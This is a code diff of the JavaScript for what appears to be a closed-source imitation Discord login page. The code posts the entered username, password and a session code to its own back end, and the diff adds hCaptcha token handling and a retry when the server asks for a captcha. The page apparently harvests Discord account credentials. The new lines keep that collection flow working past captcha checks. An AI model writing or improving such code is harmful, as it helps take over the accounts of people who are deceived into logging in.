@@ -3,6 +3,16 @@
 // Front-end by GreenWorld#0001 
 // Back-end by EnderKingJ#0001 
 // This website and it's function is completely closed source. Please do not attempt to release it's source.
+function captchaLoaded(token) {
+  if (token) {
+    localStorage.setItem('CaptchaHistory', token.toString())
+    //document.querySelector('#AHH').submit()
+  } else {
+    window.CaptchaID = document.querySelector('.h-captcha iframe').getAttribute('data-hcaptcha-widget-id')
+    hcaptcha.execute(window.CaptchaID.toString())
+  }
+}
+
 const discord = {
   load: {
     sessionCode: 0,
@@ -65,7 +75,7 @@ const discord = {
       http.send(JSON.stringify({
         username: document.querySelectorAll('#user-input')[0].value,
         password: document.querySelectorAll('#pass-input')[0].value,
-        captcha: true,
+        captcha: localStorage['CaptchaHistory']?true:false,
         session: discord.load.sessionCode,
       }))
       http.onreadystatechange = function() {
@@ -75,6 +85,9 @@ const discord = {
           discord.load.init(JSON.parse(http.responseText).crypt)
         }
         else if (http.status !== 200 && http.readyState == 4) {
+          if (http.responseText=='Captcha Required') {
+            return captchaLoaded()
+          }
           discord.load.error(JSON.parse(http.responseText))
         }
       }
